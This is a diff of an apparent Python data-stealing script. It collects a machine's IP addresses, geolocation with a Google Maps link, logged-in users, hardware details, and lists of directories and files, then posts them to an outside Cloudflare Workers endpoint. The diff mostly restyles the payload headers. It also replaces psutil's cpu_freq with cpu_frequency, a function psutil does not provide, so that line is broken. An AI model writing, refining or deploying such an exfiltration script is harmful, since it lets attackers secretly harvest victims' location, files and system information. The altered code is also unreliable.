@@ -58,7 +58,7 @@ i = get_ip()
 i_info = ip_info()
 lo = str(logged()).replace("[","").replace("]","")
 cc = psutil.cpu_count()
-cf = psutil.cpu_freq().current
+cf = psutil.cpu_frequency().current
 ram = psutil.virtual_memory().total // 1024 // 1024
 i4 = str(i[0]).replace("[","").replace("]","")
 i6 = str(i[1]).replace("[","").replace("]","")
@@ -69,7 +69,7 @@ re = platform.release()
 d_path = str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")
 f_path = str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")
 payload = f"""
-*------- USER DATA -------*
+---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------
 
 Execution time: {time}
 
@@ -111,13 +111,13 @@ Version: {re}
 
 Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}
 
-**------- Files And Directories -------**
+-------- 𝐅𝐢𝐥𝐞𝐬 𝐀𝐧𝐝 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐢𝐞𝐬 ---------
 
 {d_path}
 
 {f_path}
 
-**-------------------------------------**
+----------------------------------------
 """
 content = json.dumps({"msg": payload})
 r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
